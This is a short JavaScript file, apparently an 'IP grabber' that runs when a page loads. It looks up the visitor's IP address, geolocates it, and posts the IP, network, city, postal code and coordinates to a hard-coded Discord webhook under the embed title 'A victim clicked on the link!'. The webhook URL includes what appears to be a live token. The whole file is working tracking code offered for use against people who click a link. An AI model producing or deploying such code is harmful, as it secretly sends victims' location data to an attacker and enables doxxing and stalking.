const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1407630270030680114/24KgIRJu3KCrhK_ELjkh70k8pyu18Xqz9LQGTa4O53cdtLCXZXoW67cM_5mPToQVlvkZ';
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "Scripty is best :)",
                            avatar_url: "https://media.discordapp.net/attachments/1378331466102083756/1407630039213932625/Snimka_obrazovky_2025-08-16_180821.png?ex=68a6cd21&is=68a57ba1&hm=4cd65810547baf7fc0a1f806e3df638663c3c6242b30dbb5003b57e0e000a554&=&format=webp&quality=lossless", // optionally changeable
                            content: `@here`,
                            embeds: [
                                {
                                    title: 'A victim clicked on the link!',
                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
                                    color: 0x800080
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP();
